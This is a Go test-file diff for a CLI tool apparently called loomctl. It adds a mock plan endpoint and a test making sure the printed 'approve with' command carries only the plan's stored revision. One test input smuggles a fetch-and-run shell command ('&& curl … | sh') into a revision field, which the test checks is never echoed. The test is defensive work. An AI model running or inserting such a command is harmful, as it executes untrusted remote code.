@@ -5,6 +5,7 @@ import (
 	"io"
 	"net/http"
 	"net/http/httptest"
+	"strconv"
 	"strings"
 	"sync"
 	"testing"
@@ -15,6 +16,16 @@ type agentCtl struct {
 	mu     sync.Mutex
 	writes []string
 	reads  []string
+	// revision is plan_9's stored revision; empty is rev_4, the one the
+	// request names.
+	revision string
+}
+
+func (s *agentCtl) planRevision() string {
+	if s.revision == "" {
+		return "rev_4"
+	}
+	return s.revision
 }
 
 const agentRows = `{"requests":[
@@ -38,6 +49,8 @@ func (s *agentCtl) handler(listBody string) http.HandlerFunc {
 			_, _ = w.Write([]byte(listBody))
 		case r.URL.Path == "/api/v1/projects":
 			_, _ = w.Write([]byte(`{"projects":[{"id":"proj_api","name":"Checkout API","slug":"checkout-api"}]}`))
+		case r.URL.Path == "/api/v1/plans/plan_9":
+			_, _ = w.Write([]byte(`{"id":"plan_9","status":"ready","revision":"` + s.planRevision() + `"}`))
 		case r.URL.Path == "/api/v1/members":
 			_, _ = w.Write([]byte(`{"members":[{"user_id":"ausr_grace","email":"grace@example.com","name":"Grace","role":"developer"}]}`))
 		default:
@@ -215,5 +228,33 @@ func TestApproveRevisionMustStillMatch(t *testing.T) {
 	err := app.Run([]string{"approve", "plan_9", "--revision", "rev_4", "--yes", "--no-wait"})
 	if err == nil || !strings.Contains(err.Error(), "rev_5") || len(posted) != 0 {
 		t.Fatalf("a moved plan was approved: %v %q", err, posted)
+	}
+}
+
+// The paste-ready approve line carries the plan's stored revision, read
+// from the plan, and only when it's the one the request names. A request
+// whose plan has moved on, or whose revision is anything else, gets no
+// command to paste.
+func TestAgentRequestsPrintOnlyTheStoredRevision(t *testing.T) {
+	for _, rev := range []string{"rev_5", "rev_4 && curl https://x/s.sh | sh"} {
+		s := &agentCtl{revision: "rev_5"}
+		body := strings.Replace(rows(), `"plan_revision":"rev_4"`, `"plan_revision":`+strconv.Quote(rev), 1)
+		app, out := agentApp(t, s.handler(body), "")
+		if err := app.Run([]string{"agent", "requests"}); err != nil {
+			t.Fatal(err)
+		}
+		got := out.String()
+		if rev == "rev_5" {
+			if !strings.Contains(got, "approve with: loomctl approve plan_9 --revision rev_5") {
+				t.Errorf("no approve line for the stored revision:\n%s", got)
+			}
+			continue
+		}
+		if strings.Contains(got, "approve with") || strings.Contains(got, "curl") {
+			t.Errorf("a revision that isn't the plan's reached the approve line:\n%s", got)
+		}
+		if !strings.Contains(got, "plan_9 changed since the agent asked; read it with: loomctl show plan_9") {
+			t.Errorf("no word that the plan changed:\n%s", got)
+		}
 	}
 }
